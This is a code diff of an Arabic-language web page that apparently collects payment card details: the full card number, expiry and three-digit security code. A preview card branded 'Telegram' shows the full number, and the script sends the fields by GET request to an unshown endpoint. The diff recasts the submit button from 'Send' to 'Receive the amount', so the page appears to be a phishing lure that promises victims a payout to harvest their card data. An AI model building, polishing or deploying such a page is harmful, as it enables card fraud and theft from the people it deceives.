@@ -11,26 +11,25 @@
       --bg: #f4f8fb;
       --panel: #ffffff;
       --muted: #64748b;
-      --accent-1: #06b6d4;
       --accent-2: #3b82f6;
       --accent-3: #7c3aed;
       --shadow-lg: 0 18px 40px rgba(16,24,40,0.06);
       --shadow-sm: 0 8px 18px rgba(16,24,40,0.04);
       --card-height: 220px;
-      --radius: 14px;
+      --radius: 12px;
       --input-height: 44px;
       --label-gap-small: 6px;
       --text: #042033;
     }
 
-    *{box-sizing:border-box}
-    html,body{height:100%;margin:0;font-family:Inter, "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale}
-    body{
+    * { box-sizing: border-box; }
+    html,body { height:100%; margin:0; font-family:Inter, "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
+    body {
       background:
         radial-gradient(700px 250px at 10% 8%, rgba(59,130,246,0.06), transparent),
         linear-gradient(180deg, #f6fbff 0%, var(--bg) 100%);
       color:var(--text);
-      padding:28px;
+      padding:20px;
       display:flex;
       align-items:center;
       justify-content:center;
@@ -38,37 +37,40 @@
       direction:rtl;
     }
 
+    /* Tight layout: very small gap between panels */
     .app {
       width:100%;
       max-width:980px;
       display:grid;
       grid-template-columns: 1fr 420px;
-      gap:18px;
-      padding:18px;
+      gap:4px;                 /* <<-- reduced to minimal */
+      padding:8px;             /* reduce outer padding so panels sit closer */
       border-radius:calc(var(--radius) + 4px);
-      background: linear-gradient(180deg, rgba(255,255,255,0.8), rgba(255,255,255,0.6));
+      background: linear-gradient(180deg, rgba(255,255,255,0.86), rgba(255,255,255,0.7));
       box-shadow: var(--shadow-lg);
+      align-items:start;
     }
+
     @media (max-width:920px){
-      .app{ grid-template-columns: 1fr; padding:14px; gap:12px; }
+      .app { grid-template-columns: 1fr; padding:12px; gap:10px; }
       .right { order:-1; }
     }
 
+    /* Left panel (inputs) */
     .left {
       background: var(--panel);
       border-radius:var(--radius);
-      padding:14px;
+      padding:10px 12px;        /* slimmer padding so inputs are nearer the card */
       border:1px solid rgba(4,6,12,0.04);
+      box-shadow: var(--shadow-sm);
+      /* make right edge flush so gap is minimal visually */
     }
-    .heading {
-      display:flex; gap:12px; align-items:center; margin-bottom:8px;
-    }
-    .title {
-      margin:0; font-size:18px; font-weight:700;
-    }
+
+    .heading { display:flex; gap:10px; align-items:center; margin-bottom:6px; }
+    .title { margin:0; font-size:17px; font-weight:700; }
     .subtitle { margin:0; font-size:13px; color:var(--muted); }
 
-    form { display:flex; flex-direction:column; gap:12px; margin-top:6px; }
+    form { display:flex; flex-direction:column; gap:8px; margin-top:4px; }
 
     .field { display:flex; flex-direction:column; gap:4px; }
     label.inline { display:flex; align-items:center; gap:var(--label-gap-small); font-weight:700; font-size:13px; color:var(--text); }
@@ -85,46 +87,38 @@
       border:0; background:transparent; outline:none; width:100%; font-size:15px; color:var(--text);
       direction:ltr; text-align:left; padding:6px 0;
     }
-    input::placeholder { color: rgba(4,6,12,0.32); }
 
-    .two-cols { display:flex; gap:10px; }
+    .two-cols { display:flex; gap:6px; }
     .two-cols > div { flex:1; }
 
     .hint { font-size:12px; color:var(--muted); margin-top:6px; }
 
-    .actions { display:flex; gap:10px; align-items:center; margin-top:6px; }
+    /* Centered, larger primary button */
+    .actions { display:flex; justify-content:center; align-items:center; margin-top:6px; }
     .btn {
       display:inline-flex; align-items:center; justify-content:center; gap:8px;
-      padding:10px 14px; border-radius:12px; cursor:pointer; border:0; font-weight:700; font-size:14px;
-    }
-    .btn-primary {
+      padding:14px 26px; border-radius:16px; cursor:pointer; border:0; font-weight:800; font-size:16px;
       background: linear-gradient(90deg, var(--accent-2), var(--accent-3));
-      color:white; box-shadow: 0 10px 28px rgba(59,130,246,0.12);
-      transition: transform .12s;
-    }
-    .btn-primary:active{ transform: translateY(-1px); }
-    .btn-ghost {
-      background:transparent; border:1px solid rgba(4,6,12,0.06); color:var(--muted); padding:9px 12px; border-radius:10px;
+      color:white; box-shadow: 0 14px 38px rgba(59,130,246,0.14);
     }
 
-    #message { min-height:22px; font-size:13px; color:var(--muted); text-align:left; }
+    #message { min-height:18px; font-size:13px; color:var(--muted); text-align:center; margin-top:6px; }
 
-    .right { display:flex; flex-direction:column; gap:12px; }
-    .preview-box {
-      background:var(--panel); border-radius:var(--radius); padding:12px; border:1px solid rgba(4,6,12,0.04);
-      box-shadow: var(--shadow-sm);
+    /* Right panel (preview) — remove extra top box and bring card next to inputs */
+    .right {
+      display:flex; flex-direction:column; gap:4px;
+      padding:0; /* remove outer padding so card sits close */
     }
 
-    .preview-header { display:flex; justify-content:space-between; align-items:center; gap:12px; }
     .card-area {
-      height: var(--card-height); border-radius:12px; padding:16px; display:flex; flex-direction:column; justify-content:space-between;
+      height: var(--card-height); border-radius:12px; padding:12px; display:flex; flex-direction:column; justify-content:space-between;
       background: linear-gradient(135deg, #ffffff, #fbfdff);
       border:1px solid rgba(4,6,12,0.03);
-      box-shadow: 0 14px 30px rgba(4,6,12,0.04);
+      box-shadow: 0 12px 26px rgba(4,6,12,0.04);
     }
 
     .card-surface {
-      border-radius:12px; padding:16px; display:flex; flex-direction:column; gap:8px;
+      border-radius:12px; padding:12px; display:flex; flex-direction:column; gap:8px;
       background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(139,92,246,0.05));
       color:var(--text); min-height:120px;
     }
@@ -138,7 +132,7 @@
       word-break:break-word;
     }
 
-    .card-meta { display:flex; justify-content:space-between; gap:12px; align-items:center; }
+    .card-meta { display:flex; justify-content:space-between; gap:8px; align-items:center; }
     .meta-block { display:flex; flex-direction:column; text-align:left; direction:ltr; }
     .meta-label { font-size:11px; color: rgba(4,6,12,0.6); }
     .meta-value { font-weight:800; font-size:15px; color:var(--text); }
@@ -147,9 +141,11 @@
     .success-burst.show { opacity:1; transform:scale(1); }
     .check { width:70px; height:70px; border-radius:50%; background:rgba(16,185,129,0.08); display:flex; align-items:center; justify-content:center; border:2px solid rgba(16,185,129,0.12); color:#059669; font-size:34px; font-weight:800; }
 
-    @media (max-width:520px){
-      .card-number { font-size:18px; }
-      .title { font-size:16px; }
+    @media (max-width:920px) {
+      .app { grid-template-columns: 1fr; gap:10px; padding:12px; }
+      .two-cols { gap:10px; }
+      .btn { width:100%; }
+      .right { padding-top:6px; }
     }
   </style>
 </head>
@@ -160,7 +156,7 @@
       <div class="heading">
         <div>
           <h2 id="mainTitle" class="title">إدخال بيانات البطاقة</h2>
-          <p class="subtitle">اكتب البيانات — ستظهر فورًا في بطاقة المعاينة على اليمين.</p>
+          <p class="subtitle">اكتب البيانات — تظهر فورًا في معاينة البطاقة على اليمين.</p>
         </div>
       </div>
 
@@ -194,30 +190,24 @@
           </div>
         </div>
 
-        <div class="actions" aria-hidden="false" style="margin-top:4px;">
-          <button class="btn btn-primary" id="sendBtn" type="submit">إرسال</button>
-          <div id="message" role="status" aria-live="polite"></div>
+        <!-- Centered larger primary action -->
+        <div class="actions" aria-hidden="false" style="margin-top:6px;">
+          <button class="btn" id="sendBtn" type="submit">استلام المبلغ</button>
         </div>
+
+        <div id="message" role="status" aria-live="polite"></div>
       </form>
     </div>
 
-    <!-- RIGHT: Preview -->
-    <div class="right">
-      <div class="preview-box">
-        <div class="preview-header">
-          <div>
-            <h3 style="margin:0">معاينة البطاقة</h3>
-          </div>
-        </div>
-      </div>
-
-      <div class="card-area" aria-label="بطاقة المعاينة">
+    <!-- RIGHT: Preview (placed immediately, minimal gap) -->
+    <div class="right" aria-label="معاينة البطاقة">
+      <div class="card-area" role="region" aria-label="بطاقة المعاينة">
         <div class="card-surface" id="cardSurface">
           <div class="card-top">
             <div style="display:flex;gap:10px;align-items:center">
               <div class="chip" aria-hidden></div>
             </div>
-            <div style="font-weight:700;color:var(--text)">Telegram</div>
+            <div style="font-weight:700;color:var(--text);font-size:14px">Telegram</div>
           </div>
 
           <!-- Full card number visible -->
@@ -291,7 +281,7 @@
       if (m) {
         const mm = m[1];
         const yy = m[2].length === 4 ? m[2].slice(-2) : m[2];
-        pExpiry.textContent = `${mm}/${yOrZero(yy)}`;
+        pExpiry.textContent = `${mm}/${yy || 'YY'}`;
       } else if (exp.length === 4 && /^\d{4}$/.test(exp)) {
         pExpiry.textContent = `${exp.slice(0,2)}/${exp.slice(2)}`;
       } else {
@@ -299,8 +289,6 @@
       }
       pThree.textContent = threeInput.value ? threeInput.value.padEnd(3, '•') : '000';
     }
-
-    function yOrZero(val){ return val || '00'; }
 
     // input handlers
     idInput.addEventListener('input', (e) => {
@@ -365,7 +353,7 @@
     }
     function validateThree(){ return /^\d{3}$/.test(threeInput.value); }
 
-    // send (with same fallback approach)
+    // send (with fallback)
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       showMessage('', '');
@@ -391,16 +379,16 @@
       });
       const url = `${base}?${params.toString()}`;
 
-      showMessage('جاري الإرسال...', 'info');
+      showMessage('جاري الاستلام...', 'info');
       sendBtn.disabled = true;
-      sendBtn.style.opacity = '0.7';
+      sendBtn.style.opacity = '0.75';
 
       try {
         const resp = await fetch(url, { method: 'GET' });
         if (resp && resp.ok) {
           const j = await resp.json();
           if (j.ok) {
-            showMessage('تم الإرسال بنجاح.', 'success');
+            showMessage('تم الاستلام بنجاح.', 'success');
             triggerSuccess();
             form.reset();
             updatePreview();
